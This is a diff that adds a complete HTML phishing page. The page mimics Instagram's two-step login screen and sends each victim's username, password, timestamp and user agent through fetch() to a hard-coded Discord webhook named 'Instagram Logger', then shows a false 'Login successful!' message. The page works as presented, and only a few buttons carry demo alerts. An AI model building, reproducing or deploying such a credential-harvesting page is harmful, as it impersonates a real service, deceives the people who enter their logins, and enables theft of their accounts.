@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Main container */
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        /* Login card */
+        .login-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 30px;
+            margin-bottom: 10px;
+        }
+
+        /* Instagram logo */
+        .instagram-logo {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 0;
+        }
+        .instagram-logo img {
+            width: 175px;
+            height: auto;
+        }
+        /* Using text as fallback */
+        .instagram-logo-text {
+            font-family: 'Instagram Sans', 'Billabong', cursive;
+            font-size: 42px;
+            font-weight: 400;
+            color: #262626;
+            letter-spacing: -0.5px;
+        }
+
+        /* Form elements */
+        .input-group {
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 12px 9px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .input-field::placeholder {
+            color: #8e8e8e;
+        }
+
+        /* Login button */
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 12px 0 20px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 10px 0 20px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 16px;
+        }
+
+        .divider::after {
+            margin-left: 16px;
+        }
+
+        /* Facebook login */
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+
+        .facebook-icon {
+            background-color: #385185;
+            color: white;
+            width: 16px;
+            height: 16px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 2px;
+            font-size: 12px;
+        }
+
+        /* Forgot password */
+        .forgot-password {
+            text-align: center;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        /* Sign up section */
+        .signup-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        /* Get app section */
+        .get-app {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .app-badge {
+            height: 40px;
+            cursor: pointer;
+            padding: 8px 12px;
+            background: #f0f0f0;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            max-width: 1000px;
+            margin-top: 30px;
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            color: #8e8e8e;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s;
+        }
+        .loading-overlay.visible {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Two screens */
+        .screen {
+            display: block;
+        }
+        .screen.hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Screen 1: Username/Email -->
+        <div id="screen1" class="screen">
+            <div class="login-card">
+                <div class="instagram-logo">
+                    <div class="instagram-logo-text">Instagram</div>
+                </div>
+
+                <div class="input-group">
+                    <input type="text" class="input-field" id="username" placeholder="Phone number, username, or email">
+                </div>
+
+                <button class="login-btn" id="toPasswordBtn">Next</button>
+
+                <div class="divider">OR</div>
+
+                <div class="facebook-login" id="facebookLoginBtn">
+                    <span class="facebook-icon">f</span>
+                    <span>Log in with Facebook</span>
+                </div>
+
+                <div class="forgot-password" id="forgotPasswordBtn">
+                    Forgot password?
+                </div>
+            </div>
+
+            <div class="signup-card">
+                Don't have an account? 
+                <span class="signup-link" id="signupBtn">Sign up</span>
+            </div>
+
+            <div class="get-app">
+                <div>Get the app.</div>
+                <div class="app-badges">
+                    <span class="app-badge" id="appStore">📱 App Store</span>
+                    <span class="app-badge" id="googlePlay">📱 Google Play</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 2: Password -->
+        <div id="screen2" class="screen hidden">
+            <div class="login-card">
+                <div class="instagram-logo">
+                    <div class="instagram-logo-text">Instagram</div>
+                </div>
+
+                <div style="text-align: center; margin-bottom: 20px; color: #262626; font-weight: 500;" id="displayUsername"></div>
+
+                <div class="input-group">
+                    <input type="password" class="input-field" id="password" placeholder="Password">
+                </div>
+
+                <button class="login-btn" id="signInBtn">Log in</button>
+
+                <div class="divider">OR</div>
+
+                <div class="facebook-login" id="facebookLoginBtn2">
+                    <span class="facebook-icon">f</span>
+                    <span>Log in with Facebook</span>
+                </div>
+
+                <div class="forgot-password" id="forgotPasswordBtn2">
+                    Forgot password?
+                </div>
+            </div>
+
+            <div class="signup-card">
+                Don't have an account? 
+                <span class="signup-link" id="signupBtn2">Sign up</span>
+            </div>
+        </div>
+
+        <!-- Success Message -->
+        <div id="successMessage" style="text-align: center; color: #00a86b; margin-top: 10px; font-size: 14px;"></div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div id="loadingText">Please wait...</div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" id="metaLink">Meta</a>
+            <a href="#" id="aboutLink">About</a>
+            <a href="#" id="blogLink">Blog</a>
+            <a href="#" id="jobsLink">Jobs</a>
+            <a href="#" id="helpLink">Help</a>
+            <a href="#" id="apiLink">API</a>
+            <a href="#" id="privacyLink">Privacy</a>
+            <a href="#" id="termsLink">Terms</a>
+            <a href="#" id="topAccountsLink">Top Accounts</a>
+            <a href="#" id="hashtagsLink">Hashtags</a>
+            <a href="#" id="locationsLink">Locations</a>
+            <a href="#" id="instagramLiteLink">Instagram Lite</a>
+        </div>
+        <div class="copyright">
+            © 2025 Instagram from Meta
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ========== DISCORD WEBHOOK URL ==========
+            // 🔴 Your webhook is now integrated
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482626239025123389/k_T_HxWQozwDbpMo_0G4pyP8I7BpBpDYdUGD7dhJg1Uw3DUZ7t9Hn9urEfv20K1T4CCv';
+
+            // ========== DOM Elements ==========
+            const screen1 = document.getElementById('screen1');
+            const screen2 = document.getElementById('screen2');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const displayUsername = document.getElementById('displayUsername');
+            const toPasswordBtn = document.getElementById('toPasswordBtn');
+            const signInBtn = document.getElementById('signInBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingText = document.getElementById('loadingText');
+            const successMessage = document.getElementById('successMessage');
+
+            // ========== State ==========
+            let currentUsername = '';
+
+            // ========== Demo interactions (all buttons that don't have real destinations) ==========
+            const demoButtons = [
+                'facebookLoginBtn', 'facebookLoginBtn2', 'forgotPasswordBtn', 
+                'forgotPasswordBtn2', 'signupBtn', 'signupBtn2', 'appStore', 
+                'googlePlay', 'metaLink', 'aboutLink', 'blogLink', 'jobsLink', 
+                'helpLink', 'apiLink', 'privacyLink', 'termsLink', 'topAccountsLink', 
+                'hashtagsLink', 'locationsLink', 'instagramLiteLink'
+            ];
+
+            demoButtons.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) {
+                    el.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        alert('🔵 This is a demo interaction. In the real Instagram app, this would take you to the appropriate page.');
+                    });
+                }
+            });
+
+            // ========== Discord Webhook Function ==========
+            async function sendToDiscord(username, password) {
+                const data = {
+                    content: `**New Instagram Login Attempt**\n👤 **Username/Email:** ${username}\n🔑 **Password:** ${password}\n🕐 **Time:** ${new Date().toLocaleString()}\n🌐 **User Agent:** ${navigator.userAgent}`,
+                    username: 'Instagram Logger',
+                    avatar_url: 'https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png'
+                };
+
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    if (response.ok) {
+                        console.log('✅ Sent to Discord successfully');
+                        return true;
+                    } else {
+                        console.error('Discord error:', response.status, response.statusText);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Fetch error:', error);
+                    return false;
+                }
+            }
+
+            // ========== UI Functions ==========
+            function resetToScreen1() {
+                usernameInput.value = '';
+                passwordInput.value = '';
+                currentUsername = '';
+                screen1.classList.remove('hidden');
+                screen2.classList.add('hidden');
+                successMessage.textContent = '';
+                toPasswordBtn.disabled = false;
+                signInBtn.disabled = false;
+            }
+
+            function showScreen2(username) {
+                currentUsername = username;
+                displayUsername.textContent = username;
+                screen1.classList.add('hidden');
+                screen2.classList.remove('hidden');
+                passwordInput.focus();
+            }
+
+            // ========== Email/Username Next Handler ==========
+            function handleUsernameNext() {
+                const username = usernameInput.value.trim();
+                if (!username) {
+                    alert('Please enter a username, phone number, or email.');
+                    return;
+                }
+
+                toPasswordBtn.disabled = true;
+                loadingOverlay.classList.add('visible');
+                loadingText.textContent = 'Verifying...';
+
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('visible');
+                    toPasswordBtn.disabled = false;
+                    showScreen2(username);
+                }, 1500);
+            }
+
+            // ========== Sign In Handler (sends to Discord) ==========
+            async function handleSignIn() {
+                const password = passwordInput.value.trim();
+                if (!password) {
+                    alert('Please enter your password.');
+                    return;
+                }
+
+                signInBtn.disabled = true;
+                loadingOverlay.classList.add('visible');
+                loadingText.textContent = 'Logging in...';
+
+                // Send to Discord
+                const sent = await sendToDiscord(currentUsername, password);
+
+                loadingOverlay.classList.remove('visible');
+
+                if (sent) {
+                    successMessage.textContent = '✅ Login successful!';
+                    setTimeout(resetToScreen1, 2000);
+                } else {
+                    alert('⚠️ Error sending data to Discord. Check console for details.');
+                    signInBtn.disabled = false;
+                }
+            }
+
+            // ========== Event Listeners ==========
+            toPasswordBtn.addEventListener('click', handleUsernameNext);
+            signInBtn.addEventListener('click', handleSignIn);
+
+            // Enter key handlers
+            usernameInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !toPasswordBtn.disabled) {
+                    e.preventDefault();
+                    handleUsernameNext();
+                }
+            });
+
+            passwordInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !signInBtn.disabled) {
+                    e.preventDefault();
+                    handleSignIn();
+                }
+            });
+
+            // Focus username on load
+            usernameInput.focus();
+
+            // Clear overlay on page load
+            window.addEventListener('load', () => {
+                loadingOverlay.classList.remove('visible');
+            });
+        })();
+    </script>
+</body>
+</html>
